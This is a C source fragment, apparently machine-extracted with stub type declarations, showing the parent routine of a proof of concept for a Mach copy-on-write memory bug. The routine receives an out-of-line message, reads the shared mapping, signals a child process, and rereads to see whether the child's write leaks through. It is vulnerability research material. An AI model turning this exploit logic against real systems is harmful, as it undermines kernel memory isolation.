#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_6__   TYPE_3__ ;
typedef  struct TYPE_5__   TYPE_2__ ;
typedef  struct TYPE_4__   TYPE_1__ ;

/* Type definitions */
typedef  int uint32_t ;
struct TYPE_5__ {int msgh_size; int /*<<< orphan*/  msgh_bits; void* msgh_remote_port; } ;
struct ping_send_msg {TYPE_2__ hdr; int /*<<< orphan*/  member_0; } ;
struct TYPE_6__ {int msgh_size; void* msgh_local_port; void* msgh_remote_port; } ;
struct ping_rcv_msg {TYPE_3__ hdr; int /*<<< orphan*/  member_0; } ;
struct TYPE_4__ {int* address; int size; } ;
struct ool_rcv_msg {TYPE_3__ hdr; TYPE_1__ desc; int /*<<< orphan*/  member_0; } ;
typedef  int /*<<< orphan*/  ping_rcv ;
typedef  int /*<<< orphan*/  ping ;
typedef  int /*<<< orphan*/  msg ;
typedef  void* mach_port_t ;
typedef  int /*<<< orphan*/  kern_return_t ;

/* Variables and functions */
 int /*<<< orphan*/  LOG (char*) ; 
 int /*<<< orphan*/  MACH_ERR (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  MACH_MSGH_BITS (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  MACH_MSG_TYPE_COPY_SEND ; 
 int /*<<< orphan*/  mach_msg_receive (TYPE_3__*) ; 
 int /*<<< orphan*/  mach_msg_send (TYPE_2__*) ; 
 int /*<<< orphan*/  printf (char*,int volatile,...) ; 

void do_parent(mach_port_t shared_port) {
  kern_return_t err;

  // wait for our child to send us an OOL message
  struct ool_rcv_msg msg = {0};
  msg.hdr.msgh_local_port = shared_port;
  msg.hdr.msgh_size = sizeof(msg);
  err = mach_msg_receive(&msg.hdr);
  MACH_ERR("parent receiving child OOL message", err);

  volatile uint32_t* parent_cow_mapping = msg.desc.address;
  uint32_t parent_cow_size = msg.desc.size;

  printf("[+] parent got an OOL descriptor for %x bytes, mapped COW at: %p\n", parent_cow_size, (void*) parent_cow_mapping);

  printf("[+] parent reads: %08x\n", *parent_cow_mapping);

  LOG("telling child to try to change what I see!");

  mach_port_t parent_to_child_port = msg.hdr.msgh_remote_port;

  struct ping_send_msg ping = {0};
  ping.hdr.msgh_size = sizeof(ping);
  ping.hdr.msgh_remote_port = parent_to_child_port;
  ping.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);

  err = mach_msg_send(&ping.hdr);
  MACH_ERR("parent sending ping to child", err);

  // wait until we should try to read again:
  struct ping_rcv_msg ping_rcv = {0};
  ping_rcv.hdr.msgh_size = sizeof(ping_rcv);
  ping_rcv.hdr.msgh_local_port = shared_port;
  err = mach_msg_receive(&ping_rcv.hdr);
  MACH_ERR("parent receiving ping to try another read", err);

  LOG("parent got ping message from child, lets try to read again...");
  
  printf("[+] parent reads: %08x\n", *parent_cow_mapping);
}